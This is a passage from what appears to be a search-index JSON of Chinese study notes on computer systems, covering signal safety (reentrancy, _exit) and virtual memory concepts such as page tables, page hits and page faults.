\u200b\u963b\u585e\u200b\u4fe1\u53f7\u200b \u200b\u672a\u51b3\u200b\u4fe1\u53f7\u200b\u96c6\u200b (Pending) \u200b\u4e0d\u4f1a\u200b\u4e22\u5f03\u200b\u3002\u200b\u4fe1\u53f7\u200b\u4ea7\u751f\u200b\u540e\u200b\u88ab\u200b\u8bb0\u5f55\u200b\u5728\u200b\u672a\u51b3\u200b\u96c6\u4e2d\u200b\uff0c\u200b\u7b49\u5f85\u200b\u89e3\u9664\u200b\u963b\u585e\u200b\u540e\u200b\u9012\u9001\u200b\u3002\u200b\u4e0d\u200b\u53ef\u9760\u200b\u4fe1\u53f7\u200b\u4f1a\u200b\u88ab\u200b\u5408\u5e76\u200b\u3002 \u200b\u5fd9\u200b\u7b49\u5f85\u200b <code>while (!lpid)</code> \u200b\u4e0d\u65ad\u200b\u68c0\u67e5\u200b\u53d8\u91cf\u200b\uff0c\u200b\u6d6a\u8d39\u200b CPU \u200b\u8d44\u6e90\u200b\u3002\u200b\u5e94\u200b\u4f7f\u7528\u200b <code>pause()</code> \u200b\u6216\u200b <code>sigsuspend()</code> \u200b\u4f7f\u200b\u8fdb\u7a0b\u200b\u4f11\u7720\u200b\u3002 \u200b\u53ef\u200b\u91cd\u5165\u200b\u51fd\u6570\u200b \u200b\u7ebf\u7a0b\u200b\u5b89\u5168\u200b\u3001\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b \u200b\u53ef\u200b\u5728\u200b\u4e2d\u65ad\u200b\u6216\u200b\u4fe1\u53f7\u5904\u7406\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u5b89\u5168\u200b\u8c03\u7528\u200b\u3002\u200b\u5fc5\u987b\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u5168\u5c40\u200b/\u200b\u9759\u6001\u6570\u636e\u200b\u3002 <code>exit()</code> \u200b\u5b89\u5168\u6027\u200b \u200b\u975e\u53ef\u200b\u91cd\u5165\u200b (Unsafe) \u200b\u56e0\u200b\u6d89\u53ca\u200b\u5237\u65b0\u200b I/O \u200b\u7f13\u51b2\u533a\u200b\u548c\u200b\u8c03\u7528\u200b <code>atexit</code> \u200b\u6e05\u7406\u200b\u51fd\u6570\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u5168\u5c40\u200b\u6570\u636e\u200b\uff0c\u200b\u975e\u200b\u7ebf\u7a0b\u200b\u5b89\u5168\u200b\u3002 \u200b\u4fe1\u53f7\u200b\u5b89\u5168\u200b\u51fd\u6570\u200b <code>_exit()</code> / <code>_Exit()</code> \u200b\u4fe1\u53f7\u5904\u7406\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u7ec8\u6b62\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u5b89\u5168\u200b\u66ff\u4ee3\u200b\u65b9\u6848\u200b\uff0c\u200b\u4e0d\u200b\u6267\u884c\u200b\u6e05\u7406\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u76f4\u63a5\u200b\u9000\u51fa\u200b\u3002"},{"location":"notes/ICS/Chapter%2008%20ECF/#4","title":"4. \u200b\u4fe1\u53f7\u200b\u4e2d\u65ad\u200b\u4e0e\u200b\u539f\u5b50\u200b\u6027","text":"\u6982\u5ff5\u200b \u200b\u5173\u952e\u8bcd\u200b \u200b\u89e3\u91ca\u200b \u200b\u4e2d\u65ad\u200b\u65f6\u523b\u200b CPU \u200b\u673a\u5668\u6307\u4ee4\u200b (\u200b\u539f\u5b50\u200b\u6027\u200b) \u200b\u5185\u6838\u200b\u4fdd\u8bc1\u200b\u4fe1\u53f7\u200b\u603b\u662f\u200b\u5728\u200b\u4e00\u6761\u200b CPU \u200b\u673a\u5668\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6bd5\u200b\u540e\u200b\u624d\u200b\u4ecb\u5165\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5c42\u9762\u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b\u3002 \u200b\u6570\u636e\u200b\u7834\u574f\u200b \u200b\u590d\u6742\u200b\u64cd\u4f5c\u200b (<code>printf</code>) \u200b\u9ad8\u7ea7\u200b\u8bed\u8a00\u200b\u51fd\u6570\u200b\u7531\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u7ec4\u6210\u200b\uff0c\u200b\u4e0d\u662f\u200b\u539f\u5b50\u200b\u6027\u200b\u7684\u200b\u3002\u200b\u4fe1\u53f7\u200b\u53ef\u80fd\u200b\u5728\u200b\u51fd\u6570\u200b\u64cd\u4f5c\u200b\u5168\u5c40\u200b\u5171\u4eab\u200b\u6570\u636e\u200b\u7684\u200b\u4e2d\u95f4\u72b6\u6001\u200b\u4ecb\u5165\u200b\uff0c\u200b\u7834\u574f\u200b\u6570\u636e\u200b\u4e00\u81f4\u6027\u200b\u3002"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/","title":"Chapter 09 Virtual Memory","text":""},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#91","title":"9.1 \u200b\u7269\u7406\u200b\u548c\u200b\u865a\u62df\u200b\u5bfb\u5740","text":"<p>\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7684\u200b\u4e3b\u5b58\u200b\u88ab\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u4e00\u4e2a\u200b\u7531\u200b \\(M\\) \u200b\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u5b57\u8282\u200b\u5927\u5c0f\u200b\u7684\u200b\u5355\u5143\u200b\u7ec4\u6210\u200b\u7684\u200b\u6570\u7ec4\u200b. \u200b\u6bcf\u200b\u5b57\u8282\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b (PA). \u200b\u7b2c\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\u4e3a\u200b 0, \u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u4e3a\u200b 1, \u200b\u4f9d\u6b64\u7c7b\u63a8\u200b.</p> <p>CPU \u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\u7684\u200b\u6700\u200b\u81ea\u7136\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u7269\u7406\u5730\u5740\u200b. \u200b\u6211\u4eec\u200b\u628a\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u79f0\u4e3a\u200b\u7269\u7406\u200b\u5bfb\u5740\u200b.  \u200b\u4e0b\u56fe\u200b\u7684\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u4ece\u200b\u7269\u7406\u5730\u5740\u200b 4 \u200b\u5904\u200b\u5f00\u59cb\u200b\u7684\u200b 4 \u200b\u5b57\u8282\u200b\u5b57\u200b. CPU \u200b\u6267\u884c\u200b\u8fd9\u200b\u6761\u200b\u52a0\u8f7d\u200b\u6307\u4ee4\u200b\u65f6\u200b, \u200b\u4f1a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u6709\u6548\u200b\u7269\u7406\u5730\u5740\u200b, \u200b\u901a\u8fc7\u200b\u5185\u5b58\u200b\u603b\u7ebf\u200b\u628a\u200b\u5b83\u200b\u4f20\u9012\u200b\u7ed9\u200b\u4e3b\u5b58\u200b (\u200b\u4e00\u6b21\u200b\u4f20\u9012\u200b\u6570\u636e\u603b\u7ebf\u200b\u5bbd\u5ea6\u200b\u7684\u200b\u5b57\u200b). \u200b\u4e3b\u5b58\u200b\u53d6\u51fa\u200b\u4ece\u200b\u7269\u7406\u5730\u5740\u200b 4 \u200b\u5904\u200b\u5f00\u59cb\u200b\u7684\u200b 4 \u200b\u5b57\u8282\u200b\u5b57\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5b83\u200b\u8fd4\u56de\u200b\u7ed9\u200b CPU, CPU \u200b\u5c06\u200b\u5b83\u200b\u5b58\u653e\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u91cc\u200b. </p> <p>\u200b\u73b0\u4ee3\u200b\u5904\u7406\u5668\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u4e00\u79cd\u200b\u79f0\u4e3a\u200b\u865a\u62df\u200b\u5bfb\u5740\u200b\u7684\u200b\u5bfb\u5740\u200b\u5f62\u5f0f\u200b.  CPU \u200b\u901a\u8fc7\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u6765\u200b\u8bbf\u95ee\u200b\u4e3b\u5b58\u200b, \u200b\u8fd9\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u5728\u200b\u88ab\u200b\u9001\u5230\u200b\u5185\u5b58\u200b\u4e4b\u524d\u200b\u5148\u200b\u8f6c\u6362\u6210\u200b\u5408\u9002\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b, \u200b\u5c06\u200b\u865a\u62df\u5730\u5740\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u7269\u7406\u5730\u5740\u200b\u7684\u200b\u4efb\u52a1\u200b\u53eb\u505a\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b. CPU \u200b\u82af\u7247\u200b\u4e0a\u200b\u53eb\u505a\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u5355\u5143\u200b(MMU) \u200b\u7684\u200b\u4e13\u7528\u200b\u786c\u4ef6\u200b, \u200b\u5229\u7528\u200b\u5b58\u653e\u200b\u5728\u200b\u4e3b\u5b58\u200b\u4e2d\u200b\u7684\u200b\u67e5\u8be2\u200b\u8868\u6765\u200b\u52a8\u6001\u200b\u7ffb\u8bd1\u200b\u865a\u62df\u5730\u5740\u200b, \u200b\u8be5\u8868\u200b\u7684\u200b\u5185\u5bb9\u200b\u7531\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7ba1\u7406\u200b.</p> <p>\u200b\u7269\u7406\u200b\u5bfb\u5740\u200b\u5b58\u5728\u200b\u7684\u200b\u95ee\u9898\u200b: - \u200b\u5982\u4f55\u200b\u8ba9\u200b\u6240\u6709\u200b\u4e1c\u897f\u200b\u90fd\u200b\u5bb9\u7eb3\u200b? \u200b\u6211\u4eec\u200b\u5b9e\u9645\u200b\u5141\u8bb8\u200b\u7a0b\u5e8f\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u53ef\u80fd\u200b\u6709\u200b 2^64 \u200b\u5b57\u8282\u200b, \u200b\u4f46\u662f\u200b\u4e8b\u5b9e\u4e0a\u200b\u4e00\u822c\u200b\u7684\u200b\u5185\u5b58\u200b\u53ea\u6709\u200b 16GB \u200b\u6216\u200b 32GB. - \u200b\u4f7f\u7528\u200b\u865a\u62df\u5185\u5b58\u200b! - \u200b\u4e0d\u540c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u4f7f\u7528\u200b\u540c\u200b\u4e00\u7247\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b, \u200b\u4e07\u4e00\u200b\u522b\u7684\u200b\u8fdb\u7a0b\u200b\u628a\u200b\u6570\u636e\u200b\u5b58\u5165\u200b\u4e86\u200b\u6211\u200b\u7684\u200b\u5185\u5b58\u200b\u600e\u4e48\u529e\u200b? - \u200b\u4f7f\u7528\u200b\u865a\u62df\u5185\u5b58\u200b! - \u200b\u7a0b\u5e8f\u200b\u5982\u4f55\u200b\u77e5\u9053\u200b\u4f7f\u7528\u200b\u54ea\u200b\u5757\u5185\u5b58\u200b? - \u200b\u4f7f\u7528\u200b\u865a\u62df\u5185\u5b58\u200b! \u200b\u4e3a\u200b\u5185\u5b58\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7edf\u4e00\u200b\u7684\u200b\u89c6\u56fe\u200b, \u200b\u6240\u6709\u200b\u5185\u5b58\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u4ece\u200b 0x0000...0 \u200b\u5f00\u59cb\u200b.</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#92","title":"9.2 \u200b\u5730\u5740\u200b\u7a7a\u95f4","text":""},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#93","title":"9.3 \u200b\u865a\u62df\u5185\u5b58\u200b\u4f5c\u4e3a\u200b\u7f13\u5b58\u200b\u7684\u200b\u5de5\u5177","text":"<p>\u200b\u4ece\u200b\u6982\u5ff5\u200b\u4e0a\u5c06\u200b, \u200b\u865a\u62df\u5185\u5b58\u200b\u88ab\u200b\u7ec4\u7ec7\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u5b58\u653e\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b \\(N\\) \u200b\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u5b57\u8282\u200b\u5927\u5c0f\u200b\u7684\u200b\u5355\u5143\u200b\u7ec4\u6210\u200b\u7684\u200b\u6570\u636e\u200b. \u200b\u6bcf\u200b\u5b57\u8282\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b, \u200b\u4f5c\u4e3a\u200b\u5230\u200b\u6570\u7ec4\u200b\u7684\u200b\u7d22\u5f15\u200b. </p> <p>\u200b\u524d\u9762\u200b\u6211\u4eec\u200b\u8bf4\u200b\u5230\u200b, \u200b\u5185\u5b58\u200b\u4e0d\u8db3\u4ee5\u200b\u5bb9\u7eb3\u200b \\(2^{64}\\) \u200b\u8fd9\u4e48\u200b\u591a\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b, \u200b\u56e0\u6b64\u200b\u4e00\u90e8\u5206\u200b\u6570\u636e\u200b\u662f\u200b\u5b58\u50a8\u200b\u5728\u200b\u66f4\u200b\u4f4e\u7ea7\u200b\u7684\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b--\u200b\u78c1\u76d8\u200b\u4e2d\u200b\u7684\u200b. \u200b\u800c\u200b\u865a\u62df\u5185\u5b58\u200b\u5f88\u200b\u597d\u200b\u5730\u200b\u5145\u5f53\u200b\u4e86\u200b\u8fd9\u200b\u4e24\u7ea7\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b\u4e4b\u95f4\u200b\u7f13\u5b58\u200b\u7684\u200b\u6548\u679c\u200b.</p> <p>\u200b\u548c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e00\u6837\u200b, \u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u5206\u5272\u200b\u6210\u200b\u5757\u200b, \u200b\u4f5c\u4e3a\u200b\u78c1\u76d8\u200b\u548c\u200b\u4e3b\u5b58\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f20\u8f93\u200b\u5355\u5143\u200b. VM \u200b\u7cfb\u7edf\u200b\u5c06\u200b\u865a\u62df\u5185\u5b58\u200b\u5206\u5272\u200b\u4e3a\u200b\u79f0\u4e3a\u200b \u200b\u865a\u62df\u200b\u9875\u200b \u200b\u7684\u200b\u5927\u5c0f\u200b\u56fa\u5b9a\u200b\u7684\u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b.  \u200b\u6bcf\u4e2a\u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u5927\u5c0f\u200b\u4e3a\u200b \\(P=2^p\\) \u200b\u5b57\u8282\u200b. \u200b\u7c7b\u4f3c\u200b\u5730\u200b, \u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u88ab\u200b\u5206\u5272\u200b\u4f4d\u200b\u7269\u7406\u200b\u9875\u200b (PP), \u200b\u5927\u5c0f\u200b\u4e5f\u200b\u4e3a\u200b \\(P\\) \u200b\u5b57\u8282\u200b.</p> <p>\u200b\u5728\u200b\u4efb\u610f\u200b\u65f6\u523b\u200b, \u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u60c5\u51b5\u200b\u6709\u200b\u4e09\u79cd\u200b: - \u200b\u672a\u200b\u5206\u914d\u200b\u7684\u200b: VM \u200b\u7cfb\u7edf\u200b\u8fd8\u200b\u672a\u200b\u5206\u914d\u200b\u6216\u200b\u521b\u5efa\u200b\u7684\u200b\u9875\u200b, \u200b\u672a\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u6570\u636e\u200b\u4e0e\u200b\u5b83\u4eec\u200b\u76f8\u5173\u8054\u200b, \u200b\u56e0\u6b64\u200b\u4e0d\u200b\u5360\u7528\u200b\u4efb\u4f55\u200b\u78c1\u76d8\u7a7a\u95f4\u200b. - \u200b\u7f13\u5b58\u200b\u7684\u200b: \u200b\u5f53\u524d\u200b\u5df2\u200b\u7f13\u5b58\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u7684\u200b\u5df2\u200b\u5206\u914d\u200b\u9875\u200b - \u200b\u672a\u200b\u7f13\u5b58\u200b\u7684\u200b: \u200b\u672a\u200b\u7f13\u5b58\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u5df2\u200b\u5206\u914d\u200b\u9875\u200b</p> <p></p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#931-dram","title":"9.3.1 DRAM \u200b\u7f13\u5b58\u200b\u7684\u200b\u7ec4\u7ec7\u200b\u7ed3\u6784","text":"<p>\u200b\u7531\u4e8e\u200b DRAM \u200b\u8ddf\u200b\u78c1\u76d8\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u901f\u5ea6\u200b\u6781\u6162\u200b, \u200b\u56e0\u6b64\u200b\u865a\u62df\u200b\u9875\u200b\u5f80\u5f80\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u5f88\u5927\u200b, \u200b\u51cf\u5c11\u200b I/O \u200b\u64cd\u4f5c\u200b\u5ef6\u8fdf\u200b. \u200b\u7531\u4e8e\u200b\u5927\u200b\u7684\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u5904\u7f5a\u200b, DRAM \u200b\u7f13\u5b58\u200b\u662f\u200b\u5168\u200b\u76f8\u8054\u200b\u7684\u200b, \u200b\u5373\u200b\u4efb\u4f55\u200b\u865a\u62df\u200b\u9875\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u653e\u5728\u200b\u4efb\u4f55\u200b\u7269\u7406\u200b\u9875\u200b\u4e2d\u200b. \u200b\u4e0d\u200b\u547d\u4e2d\u200b\u65f6\u200b\u7684\u200b\u66ff\u6362\u200b\u7b56\u7565\u200b\u4e5f\u200b\u5f88\u200b\u91cd\u8981\u200b, DRAM \u200b\u7f13\u5b58\u200b\u4f7f\u7528\u200b\u4e86\u200b\u66f4\u200b\u590d\u6742\u200b\u7cbe\u5bc6\u200b\u7684\u200b\u66ff\u6362\u7b97\u6cd5\u200b. \u200b\u56e0\u4e3a\u200b\u5bf9\u200b\u78c1\u76d8\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u5f88\u957f\u200b, DRAM \u200b\u7f13\u5b58\u200b\u603b\u662f\u200b\u4f7f\u7528\u200b\u5199\u56de\u200b, \u200b\u800c\u200b\u4e0d\u662f\u200b\u76f4\u5199\u200b.</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#932","title":"9.3.2 \u200b\u9875\u8868","text":"<p>\u200b\u540c\u200b\u4efb\u4f55\u200b\u7f13\u5b58\u200b\u4e00\u6837\u200b\uff0c\u200b\u865a\u62df\u5185\u5b58\u200b\u7cfb\u7edf\u200b\u5fc5\u987b\u200b\u6709\u200b\u67d0\u79cd\u200b\u65b9\u6cd5\u200b\u6765\u200b\u5224\u5b9a\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u9875\u200b\u662f\u5426\u200b\u7f13\u5b58\u200b\u5728\u200bDRAM\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e2a\u200b\u5730\u65b9\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u8fd8\u200b\u5fc5\u987b\u200b\u786e\u5b9a\u200b\u8fd9\u4e2a\u200b\u865a\u62df\u200b\u9875\u200b\u5b58\u653e\u200b\u5728\u200b\u54ea\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\u4e2d\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u547d\u4e2d\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u5fc5\u987b\u200b\u5224\u65ad\u200b\u8fd9\u4e2a\u200b\u865a\u62df\u200b\u9875\u200b\u5b58\u653e\u200b\u5728\u200b\u78c1\u76d8\u200b\u7684\u200b\u54ea\u4e2a\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u727a\u7272\u200b\u9875\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u865a\u62df\u200b\u9875\u200b\u4ece\u200b\u78c1\u76d8\u200b\u590d\u5236\u5230\u200bDRAM\u200b\u4e2d\u200b\uff0c\u200b\u66ff\u6362\u200b\u8fd9\u4e2a\u200b\u727a\u7272\u200b\u9875\u200b\u3002</p> <p>\u200b\u8fd9\u4e9b\u200b\u529f\u80fd\u200b\u662f\u200b\u7531\u200b\u8f6f\u786c\u4ef6\u200b\u8054\u5408\u200b\u63d0\u4f9b\u200b\u7684\u200b\uff0c\u200b\u5305\u62ec\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u8f6f\u4ef6\u200b\u3001MMU(\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u5355\u5143\u200b)\u200b\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u786c\u4ef6\u200b\u548c\u200b\u4e00\u4e2a\u200b\u5b58\u653e\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u53eb\u505a\u200b\u9875\u8868\u200b(page table)\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u9875\u8868\u200b\u5c06\u200b\u865a\u62df\u200b\u9875\u200b\u6620\u5c04\u200b\u5230\u200b\u7269\u7406\u200b\u9875\u200b\u3002\u200b\u6bcf\u6b21\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u786c\u4ef6\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u7269\u7406\u5730\u5740\u200b\u65f6\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u8bfb\u53d6\u200b\u9875\u8868\u200b\u3002\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u8d1f\u8d23\u200b\u7ef4\u62a4\u200b\u9875\u8868\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0e\u200bDRAM\u200b\u4e4b\u95f4\u200b\u6765\u56de\u200b\u4f20\u9001\u200b\u9875\u200b\u3002</p> <p>\u200b\u9875\u8868\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u9875\u8868\u200b\u6761\u76ee\u200b(Page Table Entry, PTE) \u200b\u7684\u200b\u6570\u7ec4\u200b. \u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u9875\u200b\u5728\u200b\u9875\u8868\u200b\u4e2d\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u504f\u79fb\u91cf\u200b\u5904\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b PTE.</p> <p>\u200b\u6211\u4eec\u200b\u5047\u8bbe\u200b\u6bcf\u4e2a\u200b PTE \u200b\u90fd\u200b\u7531\u200b\u4e00\u4e2a\u200b\u6709\u6548\u200b\u4f4d\u200b\u548c\u200b\u4e00\u4e2a\u200b \\(n\\) \u200b\u4f4d\u200b\u5730\u5740\u200b\u5b57\u200b\u6bb5\u200b\u7ec4\u6210\u200b. \u200b\u6709\u6548\u200b\u4f4d\u200b\u8868\u660e\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u662f\u5426\u200b\u88ab\u200b\u7f13\u5b58\u200b\u5728\u200b DRAM \u200b\u4e2d\u200b. \u200b\u5982\u679c\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u6709\u6548\u200b\u4f4d\u200b, \u200b\u90a3\u4e48\u200b\u5730\u5740\u200b\u5b57\u6bb5\u200b\u5c31\u200b\u8868\u793a\u200b DRAM \u200b\u4e2d\u200b\u76f8\u5e94\u200b\u7269\u7406\u200b\u9875\u200b\u7684\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b. \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u8bbe\u7f6e\u200b\u6709\u6548\u200b\u4f4d\u200b, \u200b\u90a3\u4e48\u200b\u7a7a\u200b\u5730\u5740\u200b\u8868\u793a\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u8fd8\u200b\u672a\u200b\u5206\u914d\u200b, \u200b\u5426\u5219\u200b\u5730\u5740\u200b\u6307\u5411\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b.</p> <p></p> <p>\u200b\u8fd9\u4e2a\u200b\u7ec3\u4e60\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u4f60\u200b\u66f4\u597d\u200b\u7406\u89e3\u200b\u9875\u8868\u200b\u548c\u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u5173\u7cfb\u200b. </p> <p>Question</p> <p>\u200b\u5982\u679c\u200b\u865a\u62df\u5730\u5740\u200b\u5927\u5c0f\u200b\u6709\u200b 2^64, \u200b\u9875\u200b\u5927\u5c0f\u200b\u662f\u200b 4K, \u200b\u9700\u8981\u200b\u591a\u5c11\u200b PTE? \u200b\u5185\u200b\u5b58\u653e\u200b\u5f97\u200b\u4e0b\u200b\u5417\u200b?</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#933","title":"9.3.3 \u200b\u9875\u200b\u547d\u4e2d","text":"<p>\u200b\u5f53\u200b CPU \u200b\u60f3\u8981\u200b\u8bfb\u200b\u5305\u542b\u200b\u5728\u200b VP2 \u200b\u4e2d\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u65f6\u200b, \u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b VP2 \u200b\u88ab\u200b\u7f13\u5b58\u200b\u5728\u200b DRAM \u200b\u4e2d\u200b. \u200b\u4f7f\u7528\u200b\u5728\u200b 9.6 \u200b\u8282\u5c06\u200b\u4ecb\u7ecd\u200b\u7684\u200b\u4e00\u79cd\u200b\u6280\u672f\u200b, \u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u786c\u4ef6\u200b\u5c06\u200b\u865a\u62df\u5730\u5740\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u7d22\u5f15\u200b\u6765\u200b\u5b9a\u4f4d\u200b PTE 2, \u200b\u5e76\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u5b83\u200b. </p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#934","title":"9.3.4 \u200b\u7f3a\u9875","text":"<p>DRAM \u200b\u7f13\u5b58\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u79f0\u4e3a\u200b \u200b\u7f3a\u9875\u200b. CPU \u200b\u5f15\u7528\u200b\u4e86\u200b VP3 \u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u200b, VP3 \u200b\u5e76\u672a\u200b\u7f13\u5b58\u200b\u5728\u200b DRAM \u200b\u4e2d\u200b. \u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u786c\u4ef6\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b PTE 3, \u200b\u4ece\u200b\u6709\u6548\u200b\u4f4d\u200b\u63a8\u65ad\u51fa\u200b VP3 \u200b\u672a\u200b\u88ab\u200b\u7f13\u5b58\u200b, \u200b\u5e76\u4e14\u200b\u89e6\u53d1\u200b\u4e00\u4e2a\u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b. \u200b\u5b83\u200b\u8c03\u7528\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b\u5904\u7406\u7a0b\u5e8f\u200b, \u200b\u8be5\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u727a\u7272\u200b\u9875\u200b, \u200b\u8fd9\u91cc\u200b\u662f\u200b VP4. \u200b\u5982\u679c\u200b VP4 \u200b\u88ab\u200b\u4fee\u6539\u200b\u4e86\u200b, \u200b\u5185\u6838\u200b\u4f1a\u200b\u5c06\u200b\u5b83\u200b\u590d\u5236\u200b\u56de\u200b\u78c1\u76d8\u200b. \u200b\u65e0\u8bba\u200b\u54ea\u200b\u79cd\u200b\u60c5\u51b5\u200b, \u200b\u5185\u6838\u200b\u90fd\u200b\u4f1a\u200b\u4fee\u6539\u200b VP4 